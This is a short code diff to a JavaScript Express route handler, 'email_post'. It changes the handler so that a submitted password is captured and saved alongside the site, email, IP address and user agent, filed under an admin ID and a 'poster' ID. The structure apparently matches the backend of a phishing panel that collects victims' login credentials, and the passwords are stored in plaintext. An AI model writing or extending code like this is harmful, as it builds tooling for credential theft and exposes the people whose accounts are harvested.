@@ -35,7 +35,7 @@ export const email_post = async (req, res) => {
       
 
     const { adminId, posterId } = req.params
-    const { id, site, email } = req.body
+    const { id, site, email,password } = req.body
     const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -66,7 +66,7 @@ export const email_post = async (req, res) => {
 
            }
             const info = await Info.create({
-                site, email, 
+                site, email, password,
                 adminId:adminId,
                 poster: posterId,
                 root: posterFound._id,
